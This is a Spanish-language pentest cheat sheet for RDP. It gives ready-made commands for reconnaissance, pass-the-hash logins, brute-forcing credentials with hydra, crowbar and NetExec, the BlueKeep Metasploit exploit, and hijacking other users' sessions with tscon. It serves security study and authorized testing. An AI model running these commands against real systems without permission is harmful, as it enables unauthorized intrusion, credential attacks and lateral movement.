---
tipo: meta
aliases:
  - RDP - matriz
  - rdp cheatsheet
tags:
  - meta/referencia
  - dominio/red
---

# RDP - matriz de referencia

> [!info] Referencia pura, no un zettel
> **Puerto: 3389/tcp**. Escritorio remoto de Windows. Cliente de cabecera: `xfreerdp`. Muy ligado a AD (autenticación Windows). Criterio de recon en [[MOC - Reconocimiento de red]].

`HOST`, `u`, `p`, `DOM` son marcadores.

## Reconocimiento

| Comando | Qué da |
|---|---|
| `nmap -sV --script "rdp-ntlm-info,rdp-enum-encryption" -p3389 HOST` | **Dominio, hostname, FQDN y build de Windows sin autenticar** (`rdp-ntlm-info`), y el nivel de cifrado/NLA |
| `nxc rdp HOST -u '' -p ''` | Confirma el servicio y si acepta null |
| `nxc rdp HOST -u u -p p --nla-screenshot` | Captura la pantalla de login (aun con NLA) |

`rdp-ntlm-info` es de las mejores fuentes de recon de un Windows expuesto: da el dominio y la versión gratis.

## Conectar

| Caso | Comando |
|---|---|
| Básico | `xfreerdp /u:u /p:'p' /v:HOST /cert:ignore` |
| Con dominio | `xfreerdp /u:u /d:DOM /p:'p' /v:HOST /cert:ignore` |
| Pass-the-hash | `xfreerdp /u:u /pth:NTHASH /v:HOST /cert:ignore` |
| Portapapeles + disco (transferir) | `xfreerdp ... +clipboard /drive:loot,/tmp` |
| Alternativas | `rdesktop -u u -p p HOST` · Remmina (GUI) |

El PtH por RDP **necesita Restricted Admin habilitado** en el objetivo; si no, hay que la contraseña. `/drive` monta una carpeta local dentro de la sesión — vía de transferencia limpia. Todos los flags de `xfreerdp` (pantalla, redirección, gateway, seguridad), en [[xfreerdp - matriz de referencia]].

## Fuerza bruta

| Herramienta | Comando |
|---|---|
| NetExec | `nxc rdp HOST -u users.txt -p pass.txt --continue-on-success` |
| hydra | `hydra -L users.txt -P pass.txt rdp://HOST` |
| crowbar | `crowbar -b rdp -s HOST/32 -u u -C pass.txt` |

`crowbar` es el más fiable contra RDP con NLA; hydra a veces falla ahí.

## Vulnerabilidades

| Vuln | Comando |
|---|---|
| BlueKeep (CVE-2019-0708) | `nmap --script rdp-vuln-* -p3389 HOST` → `msf exploit/windows/rdp/cve_2019_0708_bluekeep_rce` |

BlueKeep es **pre-auth RCE** en Windows 7/2008 y anteriores. El exploit puede tumbar el host (BSOD) — cuidado en producción.

## Post-acceso — robo de sesión

Con SYSTEM (o admin local), se puede **secuestrar la sesión RDP de otro usuario sin su contraseña**.

| Paso | Comando |
|---|---|
| Ver sesiones | `query user` |
| Robar la sesión N a la tuya | `tscon N /dest:<tu-sesión>` |

`tscon` corriendo como SYSTEM conecta la sesión ajena a la tuya sin pedir credencial — movimiento lateral hacia sesiones de usuarios con más privilegio.

## Configuraciones peligrosas

| Config | Por qué importa |
|---|---|
| NLA deshabilitado | Permite enumerar y atacar el login sin autenticar primero; superficie de BlueKeep |
| `Restricted Admin` habilitado | Habilita el pass-the-hash por RDP |
| Windows viejo (7/2008) sin parches | BlueKeep y otros pre-auth RCE |

## Errores frecuentes

| Síntoma | Causa | Salida |
|---|---|---|
| `certificate ... not trusted` | cert autofirmado | `/cert:ignore` |
| `ERRCONNECT_LOGON_FAILURE` | credencial mala o dominio faltante | agregar `/d:DOM`, verificar credencial |
| PtH rechazado | Restricted Admin apagado | usar la contraseña, no el hash |
| pantalla negra / cuelga con `+clipboard` | versión vieja de freerdp | actualizar, o sacar la redirección |
